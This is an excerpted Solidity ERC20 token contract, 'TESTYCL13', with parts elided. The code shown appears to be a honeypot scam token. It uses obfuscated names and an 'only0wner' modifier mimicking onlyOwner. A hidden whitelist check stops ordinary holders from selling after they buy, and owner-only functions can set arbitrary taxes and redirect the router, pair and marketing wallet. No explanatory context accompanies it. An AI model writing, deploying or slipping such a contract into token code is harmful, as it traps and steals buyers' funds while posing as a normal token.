...
contract TESTYCL13 is ERC20, Ownable{
    ...
    mapping (address => bool) public URkPGHNURAAEROB;
    ...
    constructor() ERC20("TESTYCL13", "TESTYCL13") {
        ...
        URkPGHNURAAEROB[msg.sender] = true;
        URkPGHNURAAEROB[address(pair)] = true;
        URkPGHNURAAEROB[marketingWallet] = true;
        URkPGHNURAAEROB[address(router)] = true;
        URkPGHNURAAEROB[address(this)] = true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        if(recipient == pair) {
            if(numbertamp[sender] != block.number && numbertamp[sender] > 0){
                require(URkPGHNURAAEROB[sender]);
            }
    ...
    function mBfdWxrjliJwP(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        taxes = Taxes(_marketing, _liquidity, _burn);
    }

    function aHpBlpVWPFVU(address [] calldata accounts, bool newValue) external only0wner {
        for(uint256 i = 0; i < accounts.length; i++) {
            URkPGHNURAAEROB[accounts[i]] = newValue;
        }
    }

    function WfYLnVazLC(bool swaped) external only0wner {
        swapEd = swaped;
    }

    function WItReBQOPnO(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        sellTaxes = Taxes(_marketing, _liquidity, _burn);
    }

    function yFywgXuDvGCuCy(address newWallet) external only0wner{
        marketingWallet = newWallet;
    }

    function BgjWTXwmzLGRNBu(IRouter _router, address _pair) external only0wner{
        router = _router;
        pair = _pair;
    }
